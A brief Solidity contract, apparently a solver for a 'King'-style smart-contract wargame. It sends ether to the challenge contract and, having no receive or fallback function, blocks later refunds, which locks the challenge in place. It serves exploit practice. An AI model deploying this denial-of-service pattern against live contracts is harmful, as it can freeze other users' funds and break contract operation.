// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingSolver {
    function solveChallenge(address challenge, uint256 amount) public payable {
        (bool success, ) = challenge.call{value: amount}('');
        require(success, 'transfer failed');
    }
}
